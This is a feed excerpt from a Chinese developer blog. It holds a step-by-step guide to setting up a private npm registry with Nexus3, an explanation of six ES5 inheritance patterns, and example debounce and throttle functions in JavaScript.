    <content type="html"><![CDATA[<h1 id="Nexus-npm-私服搭建"><a href="#Nexus-npm-私服搭建" class="headerlink" title="Nexus npm 私服搭建"></a>Nexus npm 私服搭建</h1><blockquote><p>利用 Nexus3 进行 npm 的私服搭建</p></blockquote><h2 id="安装及启动服务"><a href="#安装及启动服务" class="headerlink" title="安装及启动服务"></a>安装及启动服务</h2><h4 id="1-Nexus3-需依赖-java8-环境。"><a href="#1-Nexus3-需依赖-java8-环境。" class="headerlink" title="1.  Nexus3 需依赖 java8 环境。"></a>1.  Nexus3 需依赖 java8 环境。</h4><ul><li><p>检测java版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$java -version</span><br></pre></td></tr></table></figure></li><li><p>如已安装 java8 则显示信息如下：<code>java version &quot;1.8.0_231&quot;</code></p></li></ul><h4 id="2-点击-此处-下载-Nexus"><a href="#2-点击-此处-下载-Nexus" class="headerlink" title="2. 点击 此处 下载 Nexus"></a>2. 点击 <a href="https://www.sonatype.com/download-oss-sonatype" target="_blank" rel="noopener">此处</a> 下载 Nexus</h4><h4 id="3-在任意目录下解压，进入解压后的文件夹为nexus-3-19-1-01-mac"><a href="#3-在任意目录下解压，进入解压后的文件夹为nexus-3-19-1-01-mac" class="headerlink" title="3. 在任意目录下解压，进入解压后的文件夹为nexus-3.19.1-01-mac"></a>3. 在任意目录下解压，进入解压后的文件夹为<code>nexus-3.19.1-01-mac</code></h4><h4 id="4-启动-Nexus-Repository-Manager-服务"><a href="#4-启动-Nexus-Repository-Manager-服务" class="headerlink" title="4. 启动  Nexus Repository Manager 服务"></a>4. 启动  Nexus Repository Manager 服务</h4><ul><li>输入命令:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd nexus-3.19.1-01/bin</span><br><span class="line"></span><br><span class="line">sudo ./nexus run</span><br></pre></td></tr></table></figure></li></ul><h4 id="5-访问-http-127-0-0-1-8081"><a href="#5-访问-http-127-0-0-1-8081" class="headerlink" title="5. 访问 http://127.0.0.1:8081/"></a>5. 访问 <a href="http://127.0.0.1:8081/" target="_blank" rel="noopener">http://127.0.0.1:8081/</a></h4><h4 id="6-点击右上角的登录。"><a href="#6-点击右上角的登录。" class="headerlink" title="6. 点击右上角的登录。"></a>6. 点击右上角的登录。</h4><ul><li>用户名：admin</li><li>密码：根据提示框找到对应的文件即可复制，也可按照提示修改密码</li></ul><h2 id="添加npm仓库"><a href="#添加npm仓库" class="headerlink" title="添加npm仓库"></a>添加npm仓库</h2><blockquote><p>点击<code>Create repository</code>按钮创建如下三个仓库。</p></blockquote><h4 id="1-选择-npm-proxy-进入并填写字段："><a href="#1-选择-npm-proxy-进入并填写字段：" class="headerlink" title="1. 选择 npm(proxy) 进入并填写字段："></a>1. 选择 npm(proxy) 进入并填写字段：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-proxy</span><br><span class="line">remote storage : https://registry.npmjs.org  // 或设置为https://registry.npm.taobao.org，此字段为包请求的代理地址</span><br></pre></td></tr></table></figure><ul><li>点击保存</li></ul><h4 id="2-选择-npm-hosted-填写字段并保存："><a href="#2-选择-npm-hosted-填写字段并保存：" class="headerlink" title="2. 选择 npm(hosted) 填写字段并保存："></a>2. 选择 npm(hosted) 填写字段并保存：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-hosted // 用于存放私有包</span><br></pre></td></tr></table></figure><ul><li>点击保存</li></ul><h4 id="3-选择-npm-group-进入并填写字段"><a href="#3-选择-npm-group-进入并填写字段" class="headerlink" title="3. 选择 npm(group) 进入并填写字段:"></a>3. 选择 npm(group) 进入并填写字段:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-group // 用于存放私有包</span><br></pre></td></tr></table></figure><ul><li>在 Member repositories 选项中添加 npm-proxy 和 npm-hosted</li><li>点击保存</li></ul><h2 id="配置并验证-npm-仓库"><a href="#配置并验证-npm-仓库" class="headerlink" title="配置并验证 npm 仓库"></a>配置并验证 npm 仓库</h2><h4 id="1-设置-npm-仓库地址："><a href="#1-设置-npm-仓库地址：" class="headerlink" title="1. 设置 npm 仓库地址："></a>1. 设置 npm 仓库地址：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// ip 自选</span><br><span class="line">npm config set registry http://localhost:8081/repository/npm-group/</span><br></pre></td></tr></table></figure><h4 id="2-查看-npm-仓库地址是否设置成功："><a href="#2-查看-npm-仓库地址是否设置成功：" class="headerlink" title="2. 查看 npm 仓库地址是否设置成功："></a>2. 查看 npm 仓库地址是否设置成功：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br><span class="line">// http://127.0.0.1:8081/repository/npm-group/</span><br></pre></td></tr></table></figure><h4 id="3-在任意项目路径下初始化："><a href="#3-在任意项目路径下初始化：" class="headerlink" title="3. 在任意项目路径下初始化："></a>3. 在任意项目路径下初始化：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --loglevel info install jquery</span><br></pre></td></tr></table></figure></p><ul><li>安装信息中可查看请求地址是否私服，如：<code>fetch 200 http://localhost:8081/repository/npm-group/jquery/-/jquery-3.4.1.tgz</code></li><li>查看 <a href="http://127.0.0.1:8081/#browse/search/npm" target="_blank" rel="noopener">http://127.0.0.1:8081/#browse/search/npm</a> 路由。最初搭建私服里的包内容为空，然后通过私服安装依赖包后就会被缓存下来，下次请求时就不会请求外网地址了。</li></ul><h2 id="发布包到私服"><a href="#发布包到私服" class="headerlink" title="发布包到私服"></a>发布包到私服</h2><h4 id="1-设置发布权限："><a href="#1-设置发布权限：" class="headerlink" title="1. 设置发布权限："></a>1. 设置发布权限：</h4><ul><li>在 Security-Realms 界面中 <code>npm Bearer Token Realm</code> 添加到右侧 Active 框。</li><li>点击保存</li></ul><h4 id="2-在-Security-Roles-界面中创建角色："><a href="#2-在-Security-Roles-界面中创建角色：" class="headerlink" title="2. 在 Security-Roles 界面中创建角色："></a>2. 在 Security-Roles 界面中创建角色：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Role ID: nx-deploy</span><br><span class="line">Role name: nx-deploy</span><br></pre></td></tr></table></figure><ul><li>在 Given 框下给角色赋添加 <code>nx-repository-view-*-*-*</code> 权限</li><li>点击保存</li></ul><h4 id="3-Security-Users-界面中创建用户："><a href="#3-Security-Users-界面中创建用户：" class="headerlink" title="3. Security-Users 界面中创建用户："></a>3. Security-Users 界面中创建用户：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: fuzhongfeng // ID 为发布客户端 npm 中的 username 字段</span><br><span class="line">Password: fuzhongfeng</span><br><span class="line">Email: 337925234@qq.com</span><br></pre></td></tr></table></figure><ul><li>在 granted 选项中将用户设置为上一步骤中添加的 nx-deploy 角色</li><li>注意这里的用户名和密码和邮箱在发布包到私服时会用到</li></ul><h4 id="4-配置包资源中的-package-json"><a href="#4-配置包资源中的-package-json" class="headerlink" title="4. 配置包资源中的 package.json"></a>4. 配置包资源中的 package.json</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;publishConfig&quot; : &#123;</span><br><span class="line">    &quot;registry&quot; : &quot;http://localhost:8081/repository/npm-hosted/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意这里的库为 npm-hosted</li></ul><h4 id="5-生成-npmrc-文件中的-auth-字段-（用于配置发布权限）"><a href="#5-生成-npmrc-文件中的-auth-字段-（用于配置发布权限）" class="headerlink" title="5. 生成 .npmrc 文件中的 _auth 字段:（用于配置发布权限）"></a>5. 生成 .npmrc 文件中的 _auth 字段:（用于配置发布权限）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &apos;username:password&apos; | openssl base64</span><br><span class="line">// username 和 password 分别为第三步新建user时的用户名和密码，这里为`fuzhongfeng`</span><br></pre></td></tr></table></figure><h4 id="6-客户端配置-npm-发布权限："><a href="#6-客户端配置-npm-发布权限：" class="headerlink" title="6. 客户端配置 npm 发布权限："></a>6. 客户端配置 npm 发布权限：</h4><ul><li><p>查看 npm 的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config ls -l</span><br></pre></td></tr></table></figure></li><li><p>找到 userconfig = “/Users/fuzhongfeng/.npmrc” 字段。点击打开 .npmrc 文件添加如下配置并保存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 这里的 email 为 创建 user 中的字段，_auth 为第五步中生成的base64字符串</span><br><span class="line">registry=http://127.0.0.1:8081/repository/npm-group/</span><br><span class="line">email=337925234@qq.com</span><br><span class="line">always-auth=true</span><br><span class="line">_auth=&quot;ZGVwbG95ZXI6ZGVwbG95ZXI=&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="7-项目根目录下执行："><a href="#7-项目根目录下执行：" class="headerlink" title="7. 项目根目录下执行："></a>7. 项目根目录下执行：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nexus-npm-私服搭建&quot;&gt;&lt;a href=&quot;#Nexus-npm-私服搭建&quot; class=&quot;headerlink&quot; title=&quot;Nexus npm 私服搭建&quot;&gt;&lt;/a&gt;Nexus npm 私服搭建&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;利用 Nexus3
      
    
    </summary>
    
      <category term="npm" scheme="https://fuzhongfeng.github.io/categories/npm/"/>
    
    
      <category term="npm" scheme="https://fuzhongfeng.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-继承</title>
    <link href="https://fuzhongfeng.github.io/2019/10/07/javascript-extend/"/>
    <id>https://fuzhongfeng.github.io/2019/10/07/javascript-extend/</id>
    <published>2019-10-07T13:21:11.000Z</published>
    <updated>2022-02-20T07:03:38.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><blockquote><p>es5 实现继承的 6 种方式和优缺点，以及继承的最佳方案</p></blockquote><h2 id="1-原型链"><a href="#1-原型链" class="headerlink" title="1. 原型链"></a>1. 原型链</h2><ul><li><p>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function Super() &#123;</span><br><span class="line">    this.property = true</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.getSuperValue = function() &#123;</span><br><span class="line">    return this.property</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    this.subProperty = false</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = new Super()</span><br><span class="line"></span><br><span class="line">// 替换原型后添加新方法</span><br><span class="line">Sub.prototype.getSubValue = function() &#123;</span><br><span class="line">    return this.subProperty</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var instance = new Sub()</span><br><span class="line">console.log(instance.getSuperValue()) // true</span><br></pre></td></tr></table></figure></li><li><p>原型链的问题: </p></li></ul><ol><li><p>包含引用类型值的原型属性会被所有实例共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Super() &#123;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">    this.num = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    this.subProperty = false</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = new Super()</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub()</span><br><span class="line">instance1.colors.push(&quot;black&quot;)</span><br><span class="line">instance1.num = 111 // 非引用类型属性不会互相影响</span><br><span class="line">console.log(instance1.colors, instance1.num) // [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;black&quot;]  111</span><br><span class="line"></span><br><span class="line">var instance2 = new Sub()</span><br><span class="line">console.log(instance2.colors, instance2.num) // [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;black&quot;] 1</span><br></pre></td></tr></table></figure></li><li><p>无法在不影响所有实例的情况下，给父类的构造函数传递参数</p></li></ol><h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>通过借用构造函数，可以解决原型中包含引用类型值所带来的问题。即<br>在子类构造函数的内部调用父类型构造函数</p><ul><li><p>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    //继承了 Super</span><br><span class="line">    Super.call(this, &apos;fuzhongfeng&apos;)</span><br><span class="line">    this.age = 29</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub()</span><br><span class="line">var instance2 = new Sub()</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">console.log(instance1.name, instance1.age) // &apos;fuzhongfeng&apos; 29</span><br><span class="line">console.log(instance1.colors);    //&quot;red,blue,green,black&quot;</span><br><span class="line">console.log(instance2.colors);    //&quot;red,blue,green&quot;</span><br></pre></td></tr></table></figure></li><li><p>借用构造函数的问题: </p></li></ul><ol><li>方法都在构造函数中定义，因此函数不能复用</li></ol><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>组合继承，指的是将原型链和借用构造函数的技术组合到一块，从而发挥二者之长的一种继承模式。即使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承</p><ul><li><p>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub(name, age)&#123;</span><br><span class="line">    //继承属性 </span><br><span class="line">    Super.call(this, name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sub.prototype = new Super();</span><br><span class="line">Sub.prototype.constructor = Sub; // constructor 指回自身</span><br><span class="line">Sub.prototype.sayAge = function()&#123;</span><br><span class="line">    console.log(this.age);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub(&quot;fuzhongfeng&quot;, 29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">console.log(instance1.colors); // &quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName(); // &quot;fuzhongfeng&quot;</span><br><span class="line">instance1.sayAge(); // 29</span><br><span class="line"></span><br><span class="line">var instance2 = new Sub(&quot;Feynman&quot;, 27);</span><br><span class="line">console.log(instance2.colors); // &quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName(); // &quot;Feynman&quot;</span><br><span class="line">instance2.sayAge(); // 27</span><br></pre></td></tr></table></figure></li><li><p>组合继承的问题：</p></li></ul><ol><li>组合继承最大的问题就是无论什么情况下，都会调用两次父类构造函数: 一次是在创建子类原型的时候，另一次是在子类构造函数内部。所以子类的原型上包含父类的实例属性，但在调用子类构造函数时也会包含父类的实例属性。子类实例属性会屏蔽子类原型上的同名属性。</li></ol><h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><p>创建了一个临时性的构造函数，然后将传入的对象作为这个构造函数的原型，最后返回了这个临时类型的一个新实例。</p><ul><li>实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// object()对传入其中的对象执行了一次浅复制</span><br><span class="line">function object(o)&#123;</span><br><span class="line">    function F()&#123;&#125;;</span><br><span class="line">    F.prototype = o;</span><br><span class="line">    return new F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>原生方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create()</span><br></pre></td></tr></table></figure></p><ul><li>原型式继承的问题：<br>包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样。</li></ul><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象</p><ul><li><p>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123; </span><br><span class="line">    var clone = Object.create(original); // 通过调用函数创建一个新对象</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        console.log(&quot;hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>寄生式继承的问题：</p></li></ul><ol><li>使用寄生式继承来为对象添加函数，会由于不能做到函数复用而降低效率; 这一点与构造函数模式类似。</li></ol><h2 id="寄生组合式继承-最佳方案！！！"><a href="#寄生组合式继承-最佳方案！！！" class="headerlink" title="寄生组合式继承(最佳方案！！！)"></a>寄生组合式继承(最佳方案！！！)</h2><p>不必为了指定子类的原型而调用超类的构造函数，我们所需要的无非就是超类原型的一个副本而已。本质上，就是使用寄生式继承来继承超类的原型，然后再将结果指定给子类的原型</p><ul><li>实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function inheritPrototype(subType, superType)&#123;</span><br><span class="line">    // var prototype = Object.assign(&#123;&#125;, superType.prototype);</span><br><span class="line">    var prototype = Object.create(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function Sub(name, age)&#123;</span><br><span class="line">    Super.call(this, name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inheritPrototype(Sub, Super);</span><br><span class="line"></span><br><span class="line">// 调用inheritPrototype后，才能给子类原型上添加函数</span><br><span class="line">Sub.prototype.sayAge = function()&#123;</span><br><span class="line">    console.log(this.age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="es6-extends-的实现方式"><a href="#es6-extends-的实现方式" class="headerlink" title="es6 extends 的实现方式"></a>es6 extends 的实现方式</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;继承&quot;&gt;&lt;a href=&quot;#继承&quot; class=&quot;headerlink&quot; title=&quot;继承&quot;&gt;&lt;/a&gt;继承&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;es5 实现继承的 6 种方式和优缺点，以及继承的最佳方案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-节流和防抖</title>
    <link href="https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-throttle-debounce/"/>
    <id>https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-throttle-debounce/</id>
    <published>2019-10-01T02:02:09.000Z</published>
    <updated>2022-01-23T12:24:24.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><ol><li>延迟执行的防抖</li></ol><ul><li><p>如在搜索时希望用户输入结束后再进行接口调用，也就是在一连串时间间隔小于指定时间的函数调用后触发一次。</p></li><li><p>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var debounce = function(func, wait = 100) &#123;</span><br><span class="line">var timer = null</span><br><span class="line"></span><br><span class="line">return function(...args) &#123;</span><br><span class="line">timer &amp;&amp;  clearTimeout(timer)</span><br><span class="line">        timer = setTimeout(function() &#123;</span><br><span class="line">            func.apply(this, args)</span><br><span class="line">        &#125;, wait)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 使用</span><br><span class="line">function test() &#123;</span><br><span class="line">console.log(111)</span><br><span class="line">&#125;</span><br><span class="line">var f = debounce(test, 500)</span><br><span class="line">for(var i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">f()</span><br><span class="line">&#125;</span><br><span class="line">// 111（只输出一次）</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>立即执行的防抖</li></ol><ul><li>我不希望非要等到事件停止触发后才执行，我希望立刻执行函数，然后等到停止触发 n 秒后，才可以重新触发执行。<br>如：点击一个保存按钮时，希望第一次就可以发送请求即立即执行更优，相比于延迟执行体验更好。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var debounce = function(func, wait, immediate) &#123;</span><br><span class="line">var timer = null</span><br><span class="line"></span><br><span class="line">return function (...args) &#123;</span><br><span class="line">        timer &amp;&amp;  clearTimeout(timer)</span><br><span class="line">if(immediate) &#123;</span><br><span class="line">            var callNow = !timer</span><br><span class="line">timer = setTimeout(() =&gt; &#123;</span><br><span class="line">                timer = null</span><br><span class="line">            &#125;, wait)</span><br><span class="line">            if (callNow) return func.apply(this, args) // 返回值</span><br><span class="line">&#125; else &#123;</span><br><span class="line">timer = setTimeout(() =&gt; &#123;</span><br><span class="line">                func.apply(this, args) // 这里的返回值无法取到</span><br><span class="line">&#125;, wait)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 使用</span><br><span class="line">function test() &#123;</span><br><span class="line">console.log(111)</span><br><span class="line">&#125;</span><br><span class="line">var f = debounce(test, 2000, true)</span><br></pre></td></tr></table></figure></li></ul><h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><ul><li>固定间隔执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var throttle = function(func, wait = 100) &#123;</span><br><span class="line">  var timer = null;</span><br><span class="line">  </span><br><span class="line">  return function(...arg) &#123;</span><br><span class="line">    if (!timer) &#123;</span><br><span class="line">      timer = setTimeout(() =&gt; &#123;</span><br><span class="line">        timer = null;</span><br><span class="line">        func.apply(this, arg);</span><br><span class="line">      &#125;, wait)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;防抖&quot;&gt;&lt;a href=&quot;#防抖&quot; class=&quot;headerlink&quot; title=&quot;防抖&quot;&gt;&lt;/a&gt;防抖&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;延迟执行的防抖&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;如在搜索时希望用户输入结束后再进行接口调用，也就是在一连串时间间隔
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-递归</title>
    <link href="https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-recursion/"/>
    <id>https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-recursion/</id>
    <published>2019-10-01T01:36:30.000Z</published>
    <updated>2022-01-23T12:24:24.011Z</updated>
    
